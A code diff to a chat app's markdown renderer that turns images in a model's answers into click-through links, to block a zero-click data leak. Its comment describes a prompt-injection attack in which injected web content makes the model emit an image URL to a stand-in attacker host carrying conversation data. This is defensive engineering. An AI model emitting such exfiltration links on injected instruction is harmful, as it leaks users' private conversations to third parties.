@@ -24,8 +24,33 @@ import 'katex/dist/katex.min.css'
 
 const rehypePlugins = Object.values(defaultRehypePlugins)
 
+// Images inside the model's ANSWER markdown are a prompt-injection
+// exfiltration channel: injected web content can make the model emit
+// `![](https://attacker/pixel?d=<conversation data>)`, which the browser
+// auto-loads with ZERO clicks, leaking to the attacker. Every legitimate image
+// (the generate-image tool, search results, the news widget) renders through
+// its own component, never through this markdown path — so nothing real is lost
+// by not auto-loading here.
+//
+// Rendered as a click-through link instead of an <img>. That drops it to the
+// same one-click, visible risk as an ordinary markdown link `[text](url)`,
+// which the answer already renders and which is the accepted baseline; the
+// zero-click auto-load is the only thing removed. noreferrer keeps the click
+// from leaking the page URL.
+export function AnswerImage({ src, alt }: { src?: unknown; alt?: unknown }) {
+  const href = typeof src === 'string' ? src : ''
+  const label = typeof alt === 'string' && alt ? alt : href || 'image'
+  if (!href) return <>{label}</>
+  return (
+    <a href={href} target="_blank" rel="noopener noreferrer nofollow">
+      {label}
+    </a>
+  )
+}
+
 const customComponents = {
-  a: Citing
+  a: Citing,
+  img: AnswerImage
 }
 
 export function MarkdownMessage({
